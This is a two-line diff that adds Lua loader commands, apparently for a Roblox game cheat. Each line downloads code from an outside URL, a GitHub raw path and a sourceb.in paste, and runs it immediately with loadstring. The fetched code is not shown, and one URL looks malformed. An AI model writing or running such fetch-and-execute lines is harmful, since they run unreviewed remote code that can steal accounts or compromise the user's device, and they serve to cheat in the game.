@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zenoasf/PET-LEVELUP/refs/heads/main/KONAI332%20/raw/branch/main/GAG-Lua."))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/3eunL7xBA0/0", true))()
